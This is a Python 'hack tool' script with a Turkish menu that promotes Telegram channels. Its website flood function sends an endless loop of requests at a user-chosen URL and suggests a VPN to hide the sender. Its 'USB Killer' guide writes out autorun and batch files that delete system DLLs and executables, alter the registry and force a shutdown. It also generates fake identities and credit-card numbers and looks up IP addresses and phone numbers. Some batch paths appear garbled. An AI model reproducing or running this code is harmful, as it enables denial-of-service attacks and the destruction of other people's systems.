import sys
import os
import time
import subprocess
import webbrowser
import random
import string
import json
import requests
import ipaddress
import platform
import ctypes
from urllib.request import urlopen
from faker import Faker
from bs4 import BeautifulSoup
import phonenumbers
from phonenumbers import geocoder, carrier, timezone
from phonenumbers.phonenumberutil import number_type
from pystyle import Colors, Colorate, Center, Anime
from colorama import init

init()  

def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_with_delay(text, delay=0.1):
    for char in text:
        print(char, end='', flush=True)
        time.sleep(delay)
    print()

def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

def install_modules():
    required_modules = [
        "pystyle", "urllib3", "phonenumbers", "colorama",
        "python-whois", "requests", "bs4", "faker"
    ]
    print_with_delay("ArivaHackTool kurulum sihirbazına hoş geldiniz.\nGerekli bağımlılıklar şimdi yüklenecek.\nKurulum 3 dakikadan kısa sürecek.\n3\n2\n1\n")
    for module in required_modules:
        try:
            __import__(module)
            print(Colorate.Horizontal(Colors.green_to_cyan, f"✅ {module} zaten yüklü."))
        except ImportError:
            print(Colorate.Horizontal(Colors.yellow_to_red, f"📥 {module} yükleniyor..."))
            install(module)
            print(Colorate.Horizontal(Colors.green_to_cyan, f"🎉 {module} yüklendi."))
    print(Colorate.Horizontal(Colors.green_to_cyan, "🔥 ArivaHackTool başlatılıyor..."))
    time.sleep(2)
    clear_console()

fake = Faker('tr_TR')
interval = 0.001

def propen():
    webbrowser.open("https://t.me/ArivaTools")

def display_intro():
    if platform.system() == "Windows":
        GWL_STYLE = -16
        WS_SIZEBOX = 262144
        WS_MAXIMIZEBOX = 65536
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        style = ctypes.windll.user32.GetWindowLongW(hwnd, GWL_STYLE)
        style = style & ~WS_SIZEBOX
        style = style & ~WS_MAXIMIZEBOX
        ctypes.windll.user32.SetWindowLongW(hwnd, GWL_STYLE, style)
        ctypes.windll.user32.ShowWindow(hwnd, 3)
    enter = Colorate.Horizontal(Colors.green_to_cyan, 'ArivaHackTool\'e Hoş Geldiniz, Devam Etmek İçin "ENTER" Tuşuna Basın!')
    Anime.Fade(
        Center.Center('''
      .o.       ooooooooo.   ooooo oooooo     oooo       .o.       ooooooooooooo   .oooooo.     .oooooo.   ooooo         .oooooo..o 
     .888.      `888   `Y88. `888'  `888.     .8'       .888.      8'   888   `8  d8P'  `Y8b   d8P'  `Y8b  `888'        d8P'    `Y8 
    .8"888.      888   .d88'  888    `888.   .8'       .8"888.          888      888      888 888      888  888         Y88bo.      
   .8' `888.     888ooo88P'   888     `888. .8'       .8' `888.         888      888      888 888      888  888          `"Y8888o.  
  .88ooo8888.    888`88b.     888      `888.8'       .88ooo8888.        888      888      888 888      888  888              `"Y88b 
 .8'     `888.   888  `88b.   888       `888'       .8'     `888.       888      `88b    d88' `88b    d88'  888       o oo     .d8P 
o88o     o8888o o888o  o888o o888o       `8'       o88o     o8888o     o888o      `Y8bood8P'   `Y8bood8P'  o888ooooood8 8""88888P'   
                                                                                                          
        TOOLS KANALI: @ARIVATOOLS
        SİBER DÜNYA KANALI: @SIBBERDUNYANIZ
        ADMİN VE TASARIMCI: @ATAHANARSLAN
        Başlamadan önce konsolu tam ekran yapın, telefonda yatay konuma getirin.
        Devam etmek için Enter tuşuna basın
        '''), Colors.red_to_purple, Colorate.Vertical, enter=True)

def ddos():
    print(Colorate.Horizontal(Colors.red_to_purple, "⚠️ DİKKAT!\nİstekler kullanıcı aracınızdan gönderilebilir, VPN kullanmanız önerilir!"))
    url = input(Colorate.Horizontal(Colors.yellow_to_red, "Lütfen bir URL giriniz (ör. https://example.com)\n>>> "))
    if not url.startswith(('http://', 'https://')):
        print(Colorate.Horizontal(Colors.red_to_purple, "❌ Geçersiz URL! Lütfen http:// veya https:// ile başlayan bir URL giriniz."))
        time.sleep(1)
        main()
    try:
        number_requests = 0
        print(Colorate.Horizontal(Colors.red_to_purple, "⏳ İstekler gönderiliyor... (Durdurmak için Ctrl+C kullanın)"))
        while True:
            r = requests.get(url, timeout=5)
            if r.status_code == 200:
                number_requests += 1
                print(Colorate.Horizontal(Colors.red_to_purple, f"✅ Başarılı istek #{number_requests}"))
            else:
                print(Colorate.Horizontal(Colors.red_to_purple, f"❌ Hata: {r.status_code}. Menüye dönülüyor..."))
                time.sleep(0.5)
                main()
    except KeyboardInterrupt:
        print(Colorate.Horizontal(Colors.red_to_purple, "🛑 İstekler durduruldu. Menüye dönülüyor..."))
        time.sleep(0.5)
        main()
    except:
        print(Colorate.Horizontal(Colors.red_to_purple, "❌ Bir hata oluştu. Menüye dönülüyor..."))
        time.sleep(0.5)
        main()

def gen_pass():
    k1 = input(Colorate.Horizontal(Colors.blue_to_cyan, "Parola uzunluğunu giriniz (sayı)\n>>> "))
    try:
        k1 = int(k1)
        if k1 < 1:
            raise ValueError("Uzunluk 1 veya daha büyük olmalı.")
        response = ''.join(random.choices(string.ascii_letters + string.digits, k=k1))
        print(Colorate.Horizontal(Colors.blue_to_cyan, f"🎉 Oluşturulan parola: {response}"))
    except ValueError:
        print(Colorate.Horizontal(Colors.red_to_purple, "❌ Geçersiz uzunluk! Lütfen bir sayı giriniz."))
    input(Colorate.Horizontal(Colors.blue_to_cyan, "Menüye dönmek için Enter tuşuna basınız"))
    main()

def ip_lookup():
    query = input(Colorate.Horizontal(Colors.yellow_to_red, "IP adresini giriniz (ör. 8.8.8.8)\n>>> "))
    try:
        ipaddress.ip_address(query)
        print(Colorate.Horizontal(Colors.green_to_cyan, "⏳ IP analizi yapılıyor..."))
        url = f'http://ip-api.com/json/{query}'
        response = urlopen(url, timeout=5)
        result = json.load(response)
        print(Colorate.Horizontal(Colors.green_to_cyan, f"✅ Analiz tamamlandı:"))
        print(Colorate.Horizontal(Colors.green_to_cyan, f"Durum: {result['status']}"))
        print(Colorate.Horizontal(Colors.green_to_cyan, f"Ülke: {result['country']}"))
        print(Colorate.Horizontal(Colors.green_to_cyan, f"Bölge: {result['regionName']}"))
        print(Colorate.Horizontal(Colors.green_to_cyan, f"Şehir: {result['city']}"))
        print(Colorate.Horizontal(Colors.green_to_cyan, f"İnternet Sağlayıcı: {result['isp']}"))
        print(Colorate.Horizontal(Colors.green_to_cyan, f"Organizasyon: {result['org']}"))
        print(Colorate.Horizontal(Colors.green_to_cyan, f"Proxy Kullanımı: {result['proxy']}"))
        input(Colorate.Horizontal(Colors.yellow_to_red, "Menüye dönmek için Enter tuşuna basınız"))
        main()
    except ValueError:
        print(Colorate.Horizontal(Colors.red_to_purple, "❌ Geçersiz IP adresi formatı!"))
        main()
    except:
        print(Colorate.Horizontal(Colors.red_to_purple, "❌ Bir hata oluştu!"))
        main()

def usb():
    print(Colorate.Horizontal(Colors.red_to_purple, '''💾 USB Killer Oluşturma Kılavuzu:
1. Üç dosya oluşturun: AUTOEXEC.BAT, Dead.BAT, autorun.ini
2. AUTOEXEC.BAT içeriği:
goto %config%
:dos1
rem c:vc401vc
lh keyrus
lh mmouse
lh C:WINDOWSCOMMANDmscdex /d:12345678
lh dndn
bootgui=0
:dos2
rem essolo.com
lh keyrus
lh mmouse
lh dndn
bootgui=0
:win
rem c:essolo.com
set path=C:WINDOWS;C:WINDOWSCOMMAND;c:;c:windows;c:windowscomand;c:arc;c:dn
C:WINDOWSCOMMANDDELTREE /y C:WINDOWSTEMP*.*
mode con codepage prepare=((866) C:WINDOWSCOMMANDega3.cpi)
mode con codepage sеlесt=866
keyb ru,,C:WINDOWSCOMMANDkeybrd3.sys
goto continue
:meos
c:kolibrimeosload.com
:l:meosload.com
:continue
rem bootgui=1
cd
cd windows
del *.dll
del *.ini
cd system32
del *.dll
del *.exe
cd D:
del *.exe
3. Dead.BAT içeriği:
@echo off
cp Флешка:AUTOEXEC.BAT C:
msg * "Dead" >nul
reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorer /v NoDesktop /t REG_DWORD /d 1 /f >nul
shutdown -s -t 1 -c "lol" -f >nul
4. autorun.ini içeriği:
[autorun]
OPEN=Dead.BAT
Nasıl Çalışır:
- USB takıldığında autorun.ini, Dead.BAT dosyasını çalıştırır.
- Dead.BAT, AUTOEXEC.BAT dosyasını C: sürücüsüne kopyalar ve bilgisayarı kapatır.
- Bir sonraki açılışta sistem çöker.
⚠️ DİKKAT: Bu yalnızca eğitim amaçlıdır ve izinsiz kullanım yasa dışıdır!'''))
    input(Colorate.Horizontal(Colors.red_to_purple, "Menüye dönmek için Enter tuşuna basınız"))
    main()

def fake_gen():
    print(Colorate.Horizontal(Colors.blue_to_cyan, f"👤 İsim: {fake.name()}"))
    print(Colorate.Horizontal(Colors.blue_to_cyan, f"📧 E-posta: {fake.email()}"))
    print(Colorate.Horizontal(Colors.blue_to_cyan, f"💳 Kredi Kartı: {fake.credit_card_number()}"))
    print(Colorate.Horizontal(Colors.blue_to_cyan, f"🎂 Doğum Tarihi: {fake.date_of_birth()}"))
    print(Colorate.Horizontal(Colors.blue_to_cyan, f"🏠 Adres: {fake.address()}"))
    print(Colorate.Horizontal(Colors.blue_to_cyan, f"🏢 Şirket: {fake.company()}"))
    print(Colorate.Horizontal(Colors.blue_to_cyan, f"💼 Meslek: {fake.job()}"))
    print(Colorate.Horizontal(Colors.blue_to_cyan, f"👤 Kullanıcı Adı: {fake.user_name()}"))
    input(Colorate.Horizontal(Colors.blue_to_cyan, "Menüye dönmek için Enter tuşuna basınız"))
    main()

def parser_tg():
    nick = input(Colorate.Horizontal(Colors.blue_to_cyan, "Telegram kullanıcı adını giriniz (ör. @username)\n>>> "))
    if not nick.startswith('@'):
        nick = '@' + nick
    url = f'https://t.me/{nick[1:]}'
    try:
        print(Colorate.Horizontal(Colors.blue_to_cyan, "⏳ Telegram analizi yapılıyor..."))
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            soup = BeautifulSoup(response.content, 'html.parser')
            user_name_tag = soup.find('meta', property='og:title')
            user_description_tag = soup.find('meta', property='og:description')
            if user_name_tag and user_description_tag:
                username = user_name_tag.get('content', '').strip()
                description = user_description_tag.get('content', '').strip()
                print(Colorate.Horizontal(Colors.blue_to_cyan, f"✅ Analiz tamamlandı:"))
                print(Colorate.Horizontal(Colors.blue_to_cyan, f"Kullanıcı Adı: {username}"))
                print(Colorate.Horizontal(Colors.blue_to_cyan, f"Biyografi: {description}"))
                print(Colorate.Horizontal(Colors.blue_to_cyan, f"Doğrudan Bağlantı: t.me/{nick[1:]}"))
            elif user_name_tag:
                print(Colorate.Horizontal(Colors.blue_to_cyan, f"✅ Kullanıcı bulundu: {user_name_tag.get('content', '').strip()}"))
            else:
                print(Colorate.Horizontal(Colors.red_to_purple, "❌ Böyle bir kullanıcı bulunamadı."))
        else:
            print(Colorate.Horizontal(Colors.red_to_purple, "❌ Telegram'a bağlanılamadı."))
    except:
        print(Colorate.Horizontal(Colors.red_to_purple, "❌ Bir hata oluştu."))
    input(Colorate.Horizontal(Colors.blue_to_cyan, "Menüye dönmek için Enter tuşuna basınız"))
    main()

def phone():
    number = input(Colorate.Horizontal(Colors.blue_to_cyan, "Telefon numarasını giriniz (ör. +905551234567)\n>>> "))
    try:
        my_number = phonenumbers.parse(number)
        print(Colorate.Horizontal(Colors.blue_to_cyan, "⏳ Numara analizi yapılıyor..."))
        print(Colorate.Horizontal(Colors.blue_to_cyan, f"✅ Analiz tamamlandı:"))
        print(Colorate.Horizontal(Colors.blue_to_cyan, f"Operatör: {carrier.name_for_number(my_number, 'tr')}"))
        print(Colorate.Horizontal(Colors.blue_to_cyan, f"Saat Dilimi: {timezone.time_zones_for_number(my_number)}"))
        print(Colorate.Horizontal(Colors.blue_to_cyan, f"Bölge: {geocoder.description_for_number(my_number, 'tr')}"))
        print(Colorate.Horizontal(Colors.blue_to_cyan, f"Geçerli Numara: {phonenumbers.is_valid_number(my_number)}"))
        print(Colorate.Horizontal(Colors.blue_to_cyan, f"Aktif Numara: {phonenumbers.is_possible_number(my_number)}"))
        print(Colorate.Horizontal(Colors.blue_to_cyan, f"Telegram: t.me/{number}"))
        print(Colorate.Horizontal(Colors.blue_to_cyan, f"WhatsApp: wa.me/{number}"))
        input(Colorate.Horizontal(Colors.blue_to_cyan, "Menüye dönmek için Enter tuşuna basınız"))
        main()
    except phonenumbers.NumberParseException:
        print(Colorate.Horizontal(Colors.red_to_purple, "❌ Geçersiz numara formatı!"))
        input(Colorate.Horizontal(Colors.blue_to_cyan, "Menüye dönmek için Enter tuşuna basınız"))
        main()
    except:
        print(Colorate.Horizontal(Colors.red_to_purple, "❌ Bir hata oluştu!"))
        input(Colorate.Horizontal(Colors.blue_to_cyan, "Menüye dönmek için Enter tuşuna basınız"))
        main()

def email():
    api_key = 'https://www.1secmail.com/api/v1/'
    domains = ["1secmail.com", "1secmail.org", "1secmail.net", "wwjmp.com", "esiix.com", "xojxe.com", "yoggm.com"]
    custom_name = input(Colorate.Horizontal(Colors.blue_to_cyan, "E-posta oluşturma seçeneğini seçiniz:\n1: Kendi kullanıcı adınızı seçin\n2: Rastgele kullanıcı adı\n>>> "))
    if custom_name == '1':
        name = input(Colorate.Horizontal(Colors.blue_to_cyan, "Kullanıcı adını giriniz (en az 5 karakter)\n>>> "))
        if len(name) < 5:
            print(Colorate.Horizontal(Colors.red_to_purple, "❌ Kullanıcı adı en az 5 karakter olmalı!"))
            main()
        user_name = name
    elif custom_name == '2':
        user_name = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(5))
    else:
        print(Colorate.Horizontal(Colors.red_to_purple, "❌ Geçersiz seçim!"))
        main()
    mail = f"{user_name}@{random.choice(domains)}"
    print(Colorate.Horizontal(Colors.blue_to_cyan, f"🎉 Oluşturulan e-posta: {mail}"))
    check_mail(mail)

def check_mail(mail):
    request = f'{api_key}?action=getMessages&login={mail.split("@")[0]}&domain={mail.split("@")[1]}'
    try:
        print(Colorate.Horizontal(Colors.blue_to_cyan, "⏳ Gelen kutusu kontrol ediliyor..."))
        r = requests.get(request, timeout=5).json()
        if len(r) == 0:
            print(Colorate.Horizontal(Colors.blue_to_cyan, "📬 Henüz mesaj yok, 10 saniye sonra tekrar kontrol edilecek..."))
            time.sleep(10)
            clear_console()
            check_mail(mail)
        else:
            print(Colorate.Horizontal(Colors.blue_to_cyan, f"📩 {len(r)} mesaj bulundu!"))
            for msg in r:
                read_ans = f'{api_key}?action=readMessage&login={mail.split("@")[0]}&domain={mail.split("@")[1]}&id={msg['id']}'
                r = requests.get(read_ans, timeout=5).json()
                print(Colorate.Horizontal(Colors.blue_to_cyan, f"Gönderen: {r.get('from')}"))
                print(Colorate.Horizontal(Colors.blue_to_cyan, f"Konu: {r.get('subject')}"))
                print(Colorate.Horizontal(Colors.blue_to_cyan, f"Mesaj: {r.get('textBody')}"))
            choice = input(Colorate.Horizontal(Colors.blue_to_cyan, "1: E-postayı sil\n2: Menüye dön\n>>> "))
            if choice == '1':
                delete_mail(mail)
            elif choice == '2':
                main()
            else:
                print(Colorate.Horizontal(Colors.red_to_purple, "❌ Geçersiz seçim!"))
                main()
    except:
        print(Colorate.Horizontal(Colors.red_to_purple, "❌ Gelen kutusu kontrol edilemedi!"))
        main()

def delete_mail(mail):
    request = f'{api_key}?action=deleteMail&login={mail.split("@")[0]}&domain={mail.split("@")[1]}'
    try:
        requests.get(request, timeout=5)
        print(Colorate.Horizontal(Colors.blue_to_cyan, "🗑️ E-posta başarıyla silindi."))
    except:
        print(Colorate.Horizontal(Colors.red_to_purple, "❌ E-posta silinemedi!"))
    input(Colorate.Horizontal(Colors.blue_to_cyan, "Menüye dönmek için Enter tuşuna basınız"))
    main()

def show_channels():
    clear_console()
    print(Colorate.Horizontal(Colors.cyan_to_white, '''📢 Sosyal Medya Hesaplarımız:
🚀 Tools Kanalı: t.me/ArivaTools
🌐 Siber Dünya Kanalı: t.me/SiberDunyanizz
👤 Admin ve Tasarımcı: t.me/AtahanArslan'''))
    input(Colorate.Horizontal(Colors.cyan_to_white, "Menüye dönmek için Enter tuşuna basınız"))
    main()

def redirect_admin():
    url = "https://t.me/atahanarslan"
    print(Colorate.Horizontal(Colors.cyan_to_white, "📩 t.me/atahanarslan adresine yönlendiriliyorsunuz..."))
    webbrowser.open(url)
    input(Colorate.Horizontal(Colors.cyan_to_white, "Menüye dönmek için Enter tuşuna basınız"))
    main()

def show_tool_info():
    clear_console()
    print(Colorate.Horizontal(Colors.blue_to_cyan, '''📖 ArivaHackTool Hakkında:
ArivaHackTool, siber güvenlik testleri ve analizleri için geliştirilmiş profesyonel bir araçtır. IP analizi, parola oluşturma, geçici e-posta hizmetleri, telefon numarası analizi ve daha birçok özelliği ile kullanıcılarına güçlü bir deneyim sunar. Araç, yalnızca eğitim ve yasal amaçlarla kullanılmak üzere tasarlanmıştır.

🔍 Özellikler:
- IP Adresi Analizi
- Web Sitesi Flood Testi
- Rastgele Parola Oluşturma
- Telefon Numarası Analizi
- Geçici E-posta Servisi
- Telegram Kullanıcı Analizi
- Sahte Kimlik Bilgileri Oluşturma

⚠️ Uyarı: Bu araç yalnızca yetkili testler için kullanılmalıdır. İzinsiz kullanım yasa dışıdır ve sorumluluk kullanıcıya aittir.

📩 Destek: t.me/atahanarslan'''))
    input(Colorate.Horizontal(Colors.blue_to_cyan, "Menüye dönmek için Enter tuşuna basınız"))
    main()

def tool_menu():
    clear_console()
    choice = input(Colorate.Horizontal(Colors.red_to_purple, '''
                                     __     __             
.-----.-----.----.-----.-----.-----.|  |--.|  |.-----.----.
|__ --|  -__|  __|  -__|     |  -__||    < |  ||  -__|   _|
|_____|_____|____|_____|__|__|_____||__|__||__||_____|__|  
                                                         
2️⃣ Web Sitesi Flood
3️⃣ Parola Oluştur
4️⃣ Telegram Analizi
5️⃣ Telefon Analizi
6️⃣ USB Killer (Kılavuz)
7️⃣ Geçici E-posta
8️⃣ Sahte Bilgi Oluştur
9️⃣ OGE Şablonları
0️⃣ Geri Dön
Seçiminizi yapınız >>> '''))
    if choice == '0':
        main()
    elif choice == '1':
        ip_lookup()
    elif choice == '2':
        ddos()
    elif choice == '3':
        gen_pass()
    elif choice == '4':
        parser_tg()
    elif choice == '5':
        phone()
    elif choice == '6':
        usb()
    elif choice == '7':
        email()
    elif choice == '8':
        fake_gen()
    elif choice == '9':
        print(Colorate.Horizontal(Colors.blue_to_cyan, "🛠️ Bu özellik geliştirme aşamasında..."))
        input(Colorate.Horizontal(Colors.blue_to_cyan, "Menüye dönmek için Enter tuşuna basınız"))
        tool_menu()
    else:
        print(Colorate.Horizontal(Colors.red_to_purple, "❌ Geçersiz seçim!"))
        time.sleep(1)
        tool_menu()

def main():
    clear_console()
    choice = input(Colorate.Horizontal(Colors.red_to_purple, '''                                                                                
Yazar: t.me/AtahanArslan  -  Geliştirici: t.me/ArivaTools
    _   _  _   _     __  __ ___ _  _ _   _ 
   /_\ | \| | /_\   |  \/  | __| \| | | | |
  / _ \| .` |/ _ \  | |\/| | _|| .` | |_| |
 /_/ \_\_|\_/_/ \_\ |_|  |_|___|_|\_|\___/ 
                                                
1️⃣ Tool'ü Çalıştırma
2️⃣ Admin Yönlendirme
3️⃣ Tool Hakkında Bilgi
4️⃣ Sosyal Medya Hesaplarımız
5️⃣ Tool'ü Kapatma
Seçiminizi yapınız >>> '''))
    if choice == '0' or choice == '5':
        print(Colorate.Horizontal(Colors.yellow_to_red, "👋 Tool kapatılıyor..."))
        exit(0)
    elif choice == '1':
        tool_menu()
    elif choice == '2':
        redirect_admin()
    elif choice == '3':
        show_tool_info()
    elif choice == '4':
        show_channels()
    else:
        print(Colorate.Horizontal(Colors.red_to_purple, "❌ Geçersiz seçim!"))
        time.sleep(1)
        main()

if __name__ == "__main__":
    try:
        install_modules()
        propen()
        clear_console()
        display_intro()
        main()
    except KeyboardInterrupt:
        print(Colorate.Horizontal(Colors.yellow_to_red, "👋 İşlem kullanıcı tarafından durduruldu!"))
        exit(0)
    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_purple, f"❌ Hata oluştu! Destek: t.me/atahanarslan\nHata: {e}"))
        input(Colorate.Horizontal(Colors.red_to_purple, "Çıkmak için Enter tuşuna basınız"))
        exit(1)